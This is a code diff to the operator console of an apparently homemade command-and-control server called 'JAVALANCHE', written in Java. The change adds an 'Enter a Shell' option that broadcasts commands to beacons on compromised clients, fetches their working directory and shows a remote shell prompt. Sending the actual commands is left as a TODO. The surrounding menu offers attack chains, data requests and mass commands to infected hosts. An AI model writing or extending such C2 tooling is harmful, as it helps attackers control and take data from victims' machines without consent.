@@ -233,6 +233,69 @@ public class C2ServerUserHandler implements Runnable{
         System.out.println(RESET);
     }
 
+    /**
+     * This function is used to enter a shell of one individual client
+     */
+    private void enterClientShell(){
+        System.out.println("Enter 'q' at any time to exit the shell and return to the main menu\n");
+        System.out.println("Enter IP address of Client >> ");
+        String cilentIP = userInputScanner.nextLine().toLowerCase();
+        if(cilentIP.equals("q")){
+            currentUserPath = "";
+        } else {
+            System.out.println("Setting up Shell ... ");
+
+            // Empty the Message Queue
+            synchronized(messageQueue){
+                while(!(messageQueue.isEmpty())){
+                    System.out.println(messageQueue.remove());
+                }
+            }
+
+            C2server.broadcastToBeacons("Command " + cilentIP + "_pwd");
+            try{
+                Thread.sleep(2000);
+            } catch(InterruptedException e){
+                e.printStackTrace();
+            }
+            
+            C2server.broadcastToBeacons("Request " + cilentIP + "_");
+
+            String currentMessage;
+            boolean foundCorrectClient = false;
+            String currentDirectory = "C:\\";
+    
+            synchronized(messageQueue){
+                while(!(messageQueue.isEmpty())){
+                    currentMessage = messageQueue.remove();
+                    if(foundCorrectClient){
+                        // TODO: REGEX match on file paths
+                        currentDirectory = currentMessage;
+                        break;
+                    } else if(currentMessage.contains(cilentIP)){
+                        foundCorrectClient = true;
+                    }
+                }
+            }
+
+            String command;
+            while(true){
+                if(currentDirectory.contains("C:")){
+                    System.out.println("PS " + currentDirectory + "> ");
+                } else {
+                    System.out.println("root@" + cilentIP + ":" + currentDirectory + "# ");
+                }
+
+                command = userInputScanner.nextLine();
+                if(command.equals("q")){
+                    break;
+                } else {
+                    // TODO Send command and get output
+                }
+            }
+        }
+    }
+
     private void waitForResponse() throws InterruptedException{
         // Waiting for traffic
         System.out.println();
@@ -299,22 +362,25 @@ public class C2ServerUserHandler implements Runnable{
             if(currentUserPath.equals("")){
                 printJAVALANCHE();
                 System.out.println("1. Send a command to all Clients");
-                System.out.println("2. Launch an Attack Chain");
-                System.out.println("3. Request Data from Clients");
-                System.out.println("4. Get Status from Clients");
-                System.out.println("5. Exit CLI / Close Servers");
+                System.out.println("2. Enter a Shell");
+                System.out.println("3. Launch an Attack Chain");
+                System.out.println("4. Request Data from Clients");
+                System.out.println("5. Get Status from Clients");
+                System.out.println("6. Exit CLI / Close Servers");
                 System.out.println();
                 System.out.print(currentUserPath + " >> ");
                 userInput = userInputScanner.nextLine();
                 if(userInput.equals("1")){
                     currentUserPath = "Command";
                 } else if(userInput.equals("2")){
-                    currentUserPath = "AttackChain";
+                    currentUserPath = "Shell";
                 } else if(userInput.equals("3")){
-                    currentUserPath = "Request";
+                    currentUserPath = "AttackChain";
                 } else if(userInput.equals("4")){
-                    currentUserPath = "Status";
+                    currentUserPath = "Request";
                 } else if(userInput.equals("5")){
+                    currentUserPath = "Status";
+                } else if(userInput.equals("6")){
                     System.out.println(RED + "Closing Server..."+ RESET);
                     System.out.println();
                     C2server.stopServer();
@@ -342,6 +408,8 @@ public class C2ServerUserHandler implements Runnable{
                 } else {
                     System.out.println("Invalid Input");
                 }
+            } else if(currentUserPath.equals("Shell")){
+                enterClientShell();
             } else if(currentUserPath.equals("Command Windows")){
                 sendCommand("Windows");
             } else if(currentUserPath.equals("Command Linux")){
